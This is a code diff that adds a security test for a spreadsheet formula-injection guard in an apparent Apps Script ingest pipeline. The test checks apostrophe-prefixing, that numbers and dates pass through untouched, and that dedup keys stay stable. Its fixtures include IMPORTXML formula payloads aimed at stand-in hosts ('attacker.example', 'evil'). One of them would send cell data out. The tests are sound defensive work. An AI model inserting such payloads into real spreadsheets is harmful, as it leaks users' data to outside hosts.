@@ -12547,6 +12547,81 @@ console.log('\narchiveAndPurge_ — batched writes:');
 })();
 
 /* ------------------------------------------------------------------ *
+ * Spreadsheet formula injection (CWE-1236) — security audit 2026-09-04.
+ *
+ * normalizeSupplierRow/normalizeRevenueRow only String()-coerce, and
+ * appendRow writes the result verbatim, so an upstream value beginning with
+ * = + - or @ became a LIVE FORMULA in the Sheet. Reachable through ordinary
+ * data: portal-scraped supplier names, OCR'd invoice_refs, the Order app's
+ * shopId -> `customer`.
+ * ------------------------------------------------------------------ */
+(function testSheetFormulaInjectionGuard() {
+  console.log('\nsecurity: spreadsheet formula-injection guard:');
+
+  // --- the four Sheets formula triggers are guarded ---
+  eq('sheetSafeCell_ guards a leading =', sheetSafeCell_('=IMPORTXML("https://evil/",  "//x")'),
+    "'=IMPORTXML(\"https://evil/\",  \"//x\")");
+  eq('sheetSafeCell_ guards a leading +', sheetSafeCell_('+1+1'), "'+1+1");
+  eq('sheetSafeCell_ guards a leading -', sheetSafeCell_('-1+1'), "'-1+1");
+  eq('sheetSafeCell_ guards a leading @', sheetSafeCell_('@SUM(A1)'), "'@SUM(A1)");
+
+  // --- ordinary values are untouched (no cosmetic damage to real data) ---
+  eq('a normal supplier name is untouched', sheetSafeCell_('Food and Dairy Co'), 'Food and Dairy Co');
+  eq('an invoice ref is untouched', sheetSafeCell_('INV-00123'), 'INV-00123');
+  eq('empty string is untouched', sheetSafeCell_(''), '');
+
+  // --- non-strings must pass through by identity: every money and date
+  //     column depends on this (a stringified amount would break upsert). ---
+  eq('a Number is untouched', sheetSafeCell_(1234.56), 1234.56);
+  eq('a negative Number is untouched (NOT treated as a leading "-")', sheetSafeCell_(-99.5), -99.5);
+  const dObj = new Date(Date.UTC(2026, 7, 3));
+  check('a Date passes through by identity', sheetSafeCell_(dObj) === dObj);
+  check('null passes through', sheetSafeCell_(null) === null);
+
+  // --- idempotent: ingest guards it, an _archive copy-back guards it again ---
+  eq('already-guarded value is not double-prefixed',
+    sheetSafeCell_(sheetSafeCell_('=EVIL()')), "'=EVIL()");
+
+  // --- THE load-bearing one: guarding must not move a dedup key. If it did,
+  //     every existing row would orphan and its money would re-add under a
+  //     new key. rowKey_ strips the guard, so guarded and unguarded twins
+  //     key identically — true whether or not Sheets echoes the apostrophe
+  //     back on read, which is what makes this safe without a live Sheet. ---
+  const SUPP_KEYCOLS = [5, 3]; // source, invoice_ref (Suppliers dedup key)
+  const rawRow = ['2026-08-03', 'Acme', 100, '=INV-1', 'York St', 'ordermentum', 'ts', 'Cafe'];
+  const guardedRow = sheetSafeRow_(rawRow);
+  eq('sheetSafeRow_ guarded the invoice_ref', guardedRow[3], "'=INV-1");
+  eq('...and left the numeric total alone', guardedRow[2], 100);
+  eq('guarded and unguarded rows produce the SAME dedup key',
+    rowKey_(guardedRow, SUPP_KEYCOLS), rowKey_(rawRow, SUPP_KEYCOLS));
+
+  // --- end-to-end through the real ingest path ---
+  currentSS = makeSpreadsheet();
+  const suppSheet = ensureSheet(currentSS, SUPPLIERS_TAB, SUPPLIERS_HEADERS);
+  const evil = '=IMPORTXML("https://attacker.example/"&A1,"//x")';
+  const ingest1 = ingestSupplierRows('ordermentum', [
+    { date: '2026-08-03', supplier: evil, total: 250, invoice_ref: '=INV-9', location: 'York St', department: 'Cafe' }
+  ], '2026-08-04T00:00:00+10:00', suppSheet);
+  eq('ingest wrote the row', ingest1.rowsAdded, 1);
+
+  const stored = suppSheet.getDataRange().getValues()[1];
+  check('the supplier cell is stored as TEXT, not a live formula',
+    String(stored[1]).charAt(0) === "'" && String(stored[1]).indexOf('IMPORTXML') !== -1);
+  check('the invoice_ref cell is stored as TEXT too', String(stored[3]).charAt(0) === "'");
+  eq('the total is still a real Number', stored[2], 250);
+
+  // Re-ingesting the identical row must dedup, NOT append a second copy —
+  // proof the guard did not shift the key out from under the stored row.
+  const ingest2 = ingestSupplierRows('ordermentum', [
+    { date: '2026-08-03', supplier: evil, total: 250, invoice_ref: '=INV-9', location: 'York St', department: 'Cafe' }
+  ], '2026-08-05T00:00:00+10:00', suppSheet);
+  eq('re-ingest adds nothing (key is stable across the guard)', ingest2.rowsAdded, 0);
+  eq('re-ingest is counted as a duplicate', ingest2.duplicatesSkipped, 1);
+  eq('Suppliers still holds exactly one data row',
+    suppSheet.getDataRange().getValues().length, 2);
+})();
+
+/* ------------------------------------------------------------------ *
  * appsscript.json oauthScopes coverage (step 7, PRD-14)
  *
  * appsscript.json used to declare NO oauthScopes key, so scopes were
